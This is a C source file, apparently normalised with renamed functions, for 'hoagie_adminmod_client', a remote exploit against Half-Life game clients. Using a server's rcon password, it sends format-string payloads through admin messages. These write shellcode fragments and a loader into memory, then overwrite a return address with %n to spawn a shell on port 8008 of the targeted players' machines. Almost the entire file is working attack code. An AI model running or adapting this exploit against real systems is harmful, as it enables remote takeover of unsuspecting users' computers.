#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned int STRADDR ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int /*<<< orphan*/  FUNC1 (int*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 char* loader ; 
 char* player_nick ; 
 int /*<<< orphan*/  FUNC3 (char*,...) ; 
 char* rcon_pwd ; 
 int /*<<< orphan*/  FUNC4 (int,char*,int /*<<< orphan*/ ,char*,char*,char*) ; 
 char* server_ip ; 
 int /*<<< orphan*/  server_port ; 
 char** shellcode ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*,...) ; 
 int /*<<< orphan*/  FUNC7 (char*,char*) ; 
 int /*<<< orphan*/  FUNC8 (char*,char*) ; 
 scalar_t__ FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ *,int) ; 

int FUNC11(int argc, char **argv)
{
    int sock, i,j;
    int anzsc;
    char reply[1000], command[100];
    char evil_message[100000];
    unsigned int offset, spaces;
    unsigned long addr;

    FUNC3("hoagie_adminmod_client - remote exploit for half-life-clients\n");
    FUNC3("by greuff@void.at\n\n");
    if(argc<4 || argc>5)
    {
       FUNC3("Usage: %s server_ip server_port rcon_password [player_nick]\n\n",argv[0]);
       FUNC2(1);
    }

    FUNC8(server_ip,argv[1]);
    server_port=FUNC10(argv[2],NULL,10);
    FUNC8(rcon_pwd,argv[3]);
    if(argc==5)
    {
       FUNC8(player_nick,argv[4]);
       FUNC6(command,"admin_command admin_psay \"%s\"",player_nick);
    }
    else
    {
       player_nick[0]=0;
       FUNC6(command,"admin_command admin_ssay");
    }

    if(player_nick[0]==0)
    {
       FUNC3("Sending to ALL clients! You have 3 sec to abort...\n");
       FUNC5(3);
    }

    FUNC1(&sock,server_ip,server_port);

    /********* Step 1 - send the complete shellcode and the loader to the big buffer ***********/

    offset=5000+112/2;
    spaces=0;
    for(i=21;i>=0;i--)
    {
       FUNC6(evil_message,"%s ",command);
       for(j=0;j<spaces;j++)
          FUNC7(evil_message," ");
       FUNC6(reply,"%%%du%s",offset,shellcode[i]);
       FUNC7(evil_message,reply);

       FUNC3("Writing shellcode fragment at offset %d...\n",offset);
       FUNC4(sock,server_ip,server_port,rcon_pwd,evil_message,reply);
       offset-=FUNC9(shellcode[i])+2;   // including \x0a\x00
    }

    /********* Step 2 - send the shellcode bootstrap loader ***********/

    /* correct offset because the shell loader has the double size of a shellcode chunk */
    offset-=FUNC9(shellcode[0]);
    FUNC6(evil_message,"%s ",command);
    for(j=0;j<spaces;j++)
       FUNC7(evil_message," ");
    FUNC6(reply,"%%%du%s",offset,loader);
    FUNC7(evil_message,reply);

    FUNC3("Writing bootstrap at offset %d...\n",offset);
    FUNC4(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    /********* Step 3 - construct the code that returns into the shellcode ************/

    addr=STRADDR+offset+73+spaces;
    FUNC6(evil_message,"%s AA%c%c%c%c%c%c%%.f%%.f%%.f%%.f%%.f%%.%du%%n",
         command,
         0x68,addr&0xFF,(addr>>8)&0xFF,(addr>>16)&0xFF,(addr>>24)&0xFF,0xc3,734 /* 0x3cd-13 */);
    FUNC3("Writing return into shellcode instructions...\n");
    FUNC4(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    FUNC0(sock);

    FUNC3("Shell (hopefully) spawned at client host port 8008.\n");
    return 0;
}